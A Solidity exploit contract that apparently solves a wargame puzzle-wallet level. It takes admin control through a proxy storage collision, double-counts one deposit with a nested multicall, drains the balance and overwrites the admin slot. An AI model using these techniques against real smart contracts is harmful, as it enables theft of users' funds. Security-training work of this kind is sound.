// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface IPuzzle {
    function proposeNewAdmin(address _newAdmin) external;
}

interface IWallet {
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function addToWhitelist(address addr) external;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Helper {
    address to = 0x50354c53adCa5A08e5Ad8a4B09E84BC64b91c3BF;

    function proposeNewAdmin() public {
        IPuzzle(to).proposeNewAdmin(msg.sender);
    }

    function doubleDeposit() public payable {
        IPuzzle puzzle = IPuzzle(to);
        IWallet wallet = IWallet(to);

        puzzle.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
        
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);
        wallet.multicall{value: 0.001 ether}(nestedMulticall);

        wallet.execute(msg.sender, 0.002 ether, "");

        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }

    function withdraw() public {
        selfdestruct(payable(msg.sender));
    }
}